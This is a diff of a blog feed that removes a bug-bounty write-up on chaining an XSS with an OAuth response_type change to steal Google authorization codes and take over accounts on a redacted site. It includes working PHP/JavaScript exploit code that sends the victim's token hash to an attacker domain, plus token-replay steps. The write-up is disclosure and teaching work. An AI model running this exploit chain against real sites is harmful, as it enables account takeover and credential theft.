-<span class="c1">#replace the response_type parameter value with code,id_token oauthUrl</span>
-
-<span class="nv">$location</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'response_type=code'</span><span class="p">,</span> <span class="s1">'response_type=code,id_token'</span><span class="p">,</span> <span class="nv">$location</span><span class="p">);</span> <span class="c1">// [2]</span>
-
-
-<span class="cp">?&gt;</span>
-
-
-<span class="nt">&lt;body&gt;</span>
-    <span class="nt">&lt;script&gt;</span>
-        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Oauth url: </span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$location</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="dl">"</span><span class="p">)</span>
-        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Cookie: </span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$cookie</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="dl">"</span><span class="p">)</span>
-        
-        <span class="c1">// this is the xss payload which we used to steal the authorization code  </span>
-
-        <span class="nx">payload</span> <span class="o">=</span> <span class="s2">`setTimeout(()=&gt;{fetch("</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$attackerDomain</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="s2">"%2Bescape(window.opener.document.location.hash));alert(window.opener.document.location.hash)},9000)`</span>
-
-        <span class="kd">function</span> <span class="nf">startExploit</span><span class="p">(){</span>
-            <span class="c1">// window.open location value, it opens the vulnerable xss endpoint a new window</span>
-
-
-            <span class="nx">win</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="s2">`https://login.redacted.com/xssendpoint?param=shirley')};</span><span class="p">${</span><span class="nx">payload</span><span class="p">}</span><span class="s2">;function%20xyz(){window.parent.postMessage('x`</span><span class="p">);</span>
-            <span class="c1">// wait 5 seconds</span>
-
-            <span class="c1">// This opens the oauth url in the current tab</span>
-
-            <span class="nf">setTimeout</span><span class="p">(()</span> <span class="o">=&gt;</span> <span class="p">{</span>
-                <span class="nb">window</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="s2">`</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$location</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="s2">;`</span>
-                
-            <span class="p">},</span> <span class="mi">5000</span><span class="p">);</span>
-
-            <span class="c1">//great now if I run `window.opener` from the xss page I get the whole token and everything</span>
-
-        <span class="p">}</span>
-
-    <span class="nt">&lt;/script&gt;</span>
-
-    <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"#"</span> <span class="na">onclick=</span><span class="s">"startExploit()"</span><span class="nt">&gt;</span>Start Exploit<span class="nt">&lt;/a&gt;</span>
-<span class="nt">&lt;/body&gt;</span>
-</code></pre></div></div>
-
-<p>This endpoint was responsible for generating the oauth url:</p>
-
-<p><img src="https://github.com/Sudistark/xss-writeups/assets/31372554/c80c6611-6339-478a-8a2f-8bb2cb4d7d0f" alt="BurpSuiteCommunity_xLyg501nml" /></p>
-
-<p>In the response headers you can see this cookie:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Set-Cookie: idccsrf=-898201194036363428516943317029004569446202656766185;
-</code></pre></div></div>
-
-<p>This cookie is really important , while using the the authorization code the server validates if the user’s cookie <code class="language-plaintext highlighter-rouge">idccsrf</code> matches with the <code class="language-plaintext highlighter-rouge">idccsrf</code> cookie assigned at the time of generating the ouath url.</p>
-
-<p>The above php code does the following thing,makes a request to https://login.redacted.com/services/auth/sso/google/ on line [1], from the header response get the <code class="language-plaintext highlighter-rouge">Location</code> header value and from the <code class="language-plaintext highlighter-rouge">Set-Cookie</code> header get the <code class="language-plaintext highlighter-rouge">idccsrf</code> cookie value.</p>
-
-<p>Then we send the cookie to our logging server so that we can use it later.
-On line [2] we modify the <code class="language-plaintext highlighter-rouge">response_type</code> parameter value to <code class="language-plaintext highlighter-rouge">code,id_token</code>.</p>
-
-<p>After that starts javascript code</p>
-
-<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">payload</span> <span class="o">=</span> <span class="s2">`setTimeout(()=&gt;{fetch("&lt;?php echo $attackerDomain; ?&gt;"%2Bescape(window.opener.document.location.hash));alert(window.opener.document.location.hash)},9000)`</span>
-</code></pre></div></div>
-
-<p>This is the xss payload which we will be using , basically it alerts the 
-<code class="language-plaintext highlighter-rouge">window.opener.document.location.hash</code> value after 9sec.</p>
-
-<p>The <code class="language-plaintext highlighter-rouge">startExploit</code> method does the following things which are important for this attack,</p>
-
-<p>This opens the xss endpoint via <code class="language-plaintext highlighter-rouge">window.open</code> refers to this window as winB and the current page as winA (which has all the php code,js code,etc)</p>
-
-<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">win</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="s2">`https://login.redacted.com/xssendpoint?param=shirley')};</span><span class="p">${</span><span class="nx">payload</span><span class="p">}</span><span class="s2">;function%20xyz(){window.parent.postMessage('x`</span><span class="p">);</span>
-</code></pre></div></div>
-
-<p>Then after 5sec , we redirect the winA to the value stored in <code class="language-plaintext highlighter-rouge">$location</code> variable. This variable contains the modified <code class="language-plaintext highlighter-rouge">response_type</code> oauth url.</p>
-
-<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>           <span class="nf">setTimeout</span><span class="p">(()</span> <span class="o">=&gt;</span> <span class="p">{</span>
-                <span class="nb">window</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="s2">`&lt;?php echo $location; ?&gt;;`</span>
-                
-            <span class="p">},</span> <span class="mi">5000</span><span class="p">);</span>
-</code></pre></div></div>
-
-<p>Now here’s what will happen, the oauth flow will take place automatically as soon as the url is opened there is no user interaction is involved here where they need to select the google acc, it will automatically sign in the user via their google acc which the victim has previously used.</p>
-
-<p>The winA page url will be like this after the oauth flow is done, a message will be shown on the page that the state param wasn’t provided:</p>
-
-<p>https://login.redacted.com/identity/sso/ui/AuthorizationError?ErrorCode=No_Oauth_State&amp;ErrorDescription=State+was+not+sent+back&amp;ProviderId=redacted#state=CAAAAY&amp;code=4/0Ad…&amp;id_token=eyJh………………</p>
-
-<p>The code in winB executes after 9sec (this delay is to make sure the oauth flow takes place properly in the winA tab).
-As I already explained winA and winB are of same origin login.redacted.com , we can easily accessed any info for winA window from winB.</p>
-
-<p>winA can be accessed by winB via window.opener property, to get the hash value:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>window.opener.document.location.hash
-</code></pre></div></div>
-
-<p>Now onto the next part, once we have stealed the victims authorization code. The above exploit also sends the authorization code and idcsrf cookie to attacker controlled server.</p>
-
-<p>Copy the fragment part which is also displayed in the alert popup and paste it in the <code class="language-plaintext highlighter-rouge">getToken</code> method like I have done in this</p>
-
-<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// taken one arguement from commandline</span>
-
-
-<span class="kd">function</span> <span class="nf">getToken</span><span class="p">(</span><span class="nx">token</span><span class="p">)</span> <span class="p">{</span>
-
-    <span class="c1">//split the params into array</span>
-
-    <span class="kd">var</span> <span class="nx">params</span> <span class="o">=</span> <span class="nx">token</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="dl">'</span><span class="s1">&amp;</span><span class="dl">'</span><span class="p">);</span>
-
-    <span class="c1">//get the value for state param and code param</span>
-
-    <span class="kd">var</span> <span class="nx">state</span> <span class="o">=</span> <span class="nx">params</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nf">split</span><span class="p">(</span><span class="dl">'</span><span class="s1">=</span><span class="dl">'</span><span class="p">)[</span><span class="mi">1</span><span class="p">];</span>
-    <span class="kd">var</span> <span class="nx">code</span> <span class="o">=</span> <span class="nx">params</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="nf">split</span><span class="p">(</span><span class="dl">'</span><span class="s1">=</span><span class="dl">'</span><span class="p">)[</span><span class="mi">1</span><span class="p">];</span>
-
-    <span class="c1">//console.log(state)</span>
-    <span class="c1">//console.log(code)</span>
-
-    <span class="nx">url</span> <span class="o">=</span> <span class="s2">`https://login.redacted.com/services/authcallback/google?state=</span><span class="p">${</span><span class="nx">state</span><span class="p">}</span><span class="s2">&amp;code=</span><span class="p">${</span><span class="nx">code</span><span class="p">}</span><span class="s2">&amp;scope=email+profile+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.email+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.profile+openid&amp;authuser=0&amp;prompt=none`</span>
-    <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">url</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="dl">'</span><span class="s1">;</span><span class="dl">'</span><span class="p">,</span> <span class="dl">''</span><span class="p">))</span>
-
-
-
-
-<span class="p">}</span>
-
-<span class="c1">//using this we will generate the correct callback url, just paste your input inside it</span>
-
-<span class="nf">getToken</span><span class="p">(</span><span class="dl">"</span><span class="s2">state=CAAAAY&amp;code=4/0AWtgz&amp;scope=email%20profile%20https://www.googleapis.com/auth/userinfo.email%20https://www.googleapis.com/auth/userinfo.profile%20openid&amp;id_token=eyJhb.............&amp;authuser=0&amp;prompt=none</span><span class="dl">"</span><span class="p">)</span>
-</code></pre></div></div>
-
-<p>The above code will give us the url which can be used now to login into the victim’s account.There is just one important thing to take care of which is the <code class="language-plaintext highlighter-rouge">idccsrf</code> token at first I didn;t noticed this cookie parameter and was wondering for so long why I wasn’t able to login to victim’s acc.</p>
-
-<p>So turn on Burp Intercept and load this url in your browser, add this cookie header which has the idcsrf parameter (you can get this from the server logs). Once you do the following now you can succefully logged in to the victim’s account.</p>]]></content><author><name>sudi</name><email>sudi[at]wearehackerone.com</email></author><category term="bug-bounty" /><summary type="html"><![CDATA[My friend @testingforbugs reached to out to me , he had a xss in login.redacted.com and wanted to escalate the xss bug impact, cookies were marked as httponly and the main functionalities of the application were on www.redacted.com so the escalation wasn’t going to be easy here.]]></summary></entry></feed>
+<p><img src="https://github.com/Sudistark/BB-Writeups/assets/31372554/b501f9f9-57f4-4138-8984-23ea6e981ec9" alt="image" /></p>]]></content><author><name>sudi</name><email>sudi[at]wearehackerone.com</email></author><category term="bug-bounty" /><summary type="html"><![CDATA[This is probably the best bug I have ever found on a bug bounty target, consider it impact wise or the coolness of this exploit.]]></summary></entry></feed>
